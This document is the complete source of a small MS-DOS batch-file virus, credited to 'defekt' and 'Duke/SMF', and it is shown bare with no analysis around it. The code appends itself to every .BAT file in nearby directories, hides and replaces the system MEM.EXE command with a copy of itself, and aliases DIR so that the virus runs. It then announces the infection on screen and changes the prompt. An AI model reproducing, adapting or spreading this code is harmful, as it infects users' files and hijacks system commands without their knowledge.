
@CTTY NUL
SET M=%windir%\COMMAND\MEM.BAT
FOR %%I IN (*.BAT ..\*.BAT \*.BAT) DO COPY %%I+%0 %%I
DOSKEY DIR = mem
IF %0==mem GOTO A
IF EXIST %M% GOTO END
CD %windir%\COMMAND
REN MEM.EXE M.EXE
ATTRIB M.EXE +H
COPY %0 %M%
GOTO END
:A
CTTY CON
@ECHO Your computer infected by me!
@PAUSE
@PROMPT $LiNFeCteD$G
@CALL M.EXE
:END mem2 by defekt with BugFix by Duke/SMF
@CTTY CON